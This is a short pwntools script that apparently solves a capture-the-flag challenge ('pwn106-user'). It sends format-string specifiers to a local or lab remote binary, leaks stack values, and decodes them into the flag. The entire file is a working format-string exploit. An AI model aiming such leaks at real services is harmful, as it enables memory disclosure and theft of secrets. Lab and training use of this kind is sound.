#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn106user.pwn106-user", checksec=False)
request = [b"%6$p", b"%7$p", b"%8$p", b"%9$p", b"%10$p", b"%11$p"]

REMOTE_IP = "10.10.2.126"
PORT=9006

flag = ""
for index in range(0,len(request)):
    p = remote(REMOTE_IP, PORT) if args.REMOTE else process(binary.path)
    p.sendlineafter(b"giveaway: ", request[index])
    part = p.recv()[10:-1]
    flag += "".join([chr(int(part[i:i+2], 16)) for i in range(0, len(part),2)])[::-1]
print(flag)
